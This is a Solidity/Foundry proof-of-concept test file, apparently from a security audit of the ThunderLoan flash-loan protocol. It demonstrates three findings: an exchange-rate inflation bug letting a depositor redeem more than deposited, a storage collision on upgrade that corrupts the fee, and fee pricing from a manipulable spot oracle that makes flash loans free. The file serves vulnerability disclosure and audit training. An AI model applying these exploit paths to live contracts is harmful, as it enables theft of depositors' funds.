// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// ---- Self-contained mocks (no-arg friendly), so we do not depend on the
// ---- broken BaseTest.t.sol ERC20Mock constructor mismatch in this lib pin.
contract TokenMock is ERC20 {
    constructor() ERC20("Token", "TKN") { }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract TSwapPoolMock {
    uint256 public price = 1e18; // 1 token == 1 WETH initially

    // Live spot price, settable to simulate an AMM whose reserves an
    // attacker can move within a transaction (e.g. via a flash swap).
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) {
        return price;
    }

    function setPrice(uint256 newPrice) external {
        price = newPrice;
    }
}

contract PoolFactoryMock {
    mapping(address => address) private s_pools;

    function createPool(address token) external returns (address) {
        TSwapPoolMock pool = new TSwapPoolMock();
        s_pools[token] = address(pool);
        return address(pool);
    }

    function getPool(address token) external view returns (address) {
        return s_pools[token];
    }
}

contract DuoLaSafePoC is Test {
    ThunderLoan internal thunderLoan;
    PoolFactoryMock internal factory;
    TokenMock internal token;
    AssetToken internal assetToken;

    address internal liquidityProvider = makeAddr("lp");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        ThunderLoan impl = new ThunderLoan();
        factory = new PoolFactoryMock();
        token = new TokenMock();
        factory.createPool(address(token));

        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(factory));

        assetToken = thunderLoan.setAllowedToken(IERC20(address(token)), true);
    }

    /*//////////////////////////////////////////////////////////////
        FINDING 1 (HIGH): deposit() wrongly inflates the exchange rate
        by calling updateExchangeRate() with a "fee" that was never
        actually earned. This breaks the deposit/redeem accounting and
        lets a single LP redeem MORE underlying than they deposited,
        draining funds belonging to others / the protocol.
    //////////////////////////////////////////////////////////////*/
    function testDepositInflatesExchangeRateAndBreaksRedeem() public {
        // Seed liquidity so the pool has underlying to pay out the "extra".
        uint256 lpDeposit = 1000e18;
        token.mint(liquidityProvider, lpDeposit);
        vm.startPrank(liquidityProvider);
        token.approve(address(thunderLoan), lpDeposit);
        thunderLoan.deposit(IERC20(address(token)), lpDeposit);
        vm.stopPrank();

        // Attacker deposits a known amount.
        uint256 amount = 100e18;
        token.mint(attacker, amount);
        vm.startPrank(attacker);
        token.approve(address(thunderLoan), amount);
        thunderLoan.deposit(IERC20(address(token)), amount);

        // Attacker holds asset tokens; redeem them all immediately.
        uint256 assetBal = assetToken.balanceOf(attacker);
        thunderLoan.redeem(IERC20(address(token)), assetBal);
        vm.stopPrank();

        uint256 redeemed = token.balanceOf(attacker);
        console.log("Attacker deposited :", amount);
        console.log("Attacker redeemed  :", redeemed);

        // BUG: redeemed strictly MORE than deposited, with zero flash loans.
        assertGt(redeemed, amount, "expected to redeem more than deposited (accounting bug)");
    }

    /*//////////////////////////////////////////////////////////////
        FINDING 2 (CRITICAL): Storage-layout collision on upgrade.
        v1 storage:   slot s_tokenToAssetToken | s_feePrecision | s_flashLoanFee | ...
        v2 storage:   slot s_tokenToAssetToken | s_flashLoanFee  | (FEE_PRECISION is constant) | ...
        Because v2 removed the storage var s_feePrecision (made FEE_PRECISION a
        constant), s_flashLoanFee in v2 now reads the slot that held the OLD
        s_feePrecision (1e18). After upgrade the fee silently becomes 1e18
        instead of 3e15 — a corrupted, attacker-relevant protocol parameter.
    //////////////////////////////////////////////////////////////*/
    function testUpgradeStorageCollisionCorruptsFee() public {
        uint256 feeBefore = thunderLoan.getFee();
        console.log("v1 s_flashLoanFee  :", feeBefore); // 3e15

        ThunderLoanUpgraded upgradedImpl = new ThunderLoanUpgraded();
        thunderLoan.upgradeTo(address(upgradedImpl));

        uint256 feeAfter = ThunderLoanUpgraded(address(thunderLoan)).getFee();
        console.log("v2 s_flashLoanFee  :", feeAfter); // collides -> 1e18

        assertEq(feeBefore, 3e15, "v1 fee should be 0.3%");
        assertEq(feeAfter, 1e18, "v2 fee should have been corrupted by storage collision");
        assertTrue(feeAfter != feeBefore, "upgrade silently changed the fee");
    }

    /*//////////////////////////////////////////////////////////////
        FINDING 3 (HIGH): Flash-loan fee is priced off a manipulable
        on-chain spot oracle (TSwap getPriceOfOnePoolTokenInWeth) with
        no TWAP / sanity check. An attacker who can move the AMM price
        within the same transaction (a flash swap, fully composable with
        the flash loan) makes the fee collapse toward zero, borrowing
        protocol liquidity for free and starving LPs of yield.
    //////////////////////////////////////////////////////////////*/
    function testFeeFollowsManipulableSpotOracle() public {
        uint256 borrow = 100e18;

        // Fair fee at the honest price (1e18).
        uint256 fairFee = thunderLoan.getCalculatedFee(IERC20(address(token)), borrow);

        // Attacker depresses the AMM spot price for `token` (price -> ~0).
        TSwapPoolMock pool = TSwapPoolMock(factory.getPool(address(token)));
        pool.setPrice(1); // 1 wei of WETH per token

        uint256 manipulatedFee = thunderLoan.getCalculatedFee(IERC20(address(token)), borrow);

        console.log("Fair fee        :", fairFee);
        console.log("Manipulated fee :", manipulatedFee);

        assertGt(fairFee, 0, "fair fee should be non-zero");
        // Fee collapses to (effectively) zero under price manipulation.
        assertEq(manipulatedFee, 0, "manipulated fee rounds to zero -> free flash loan");
    }
}
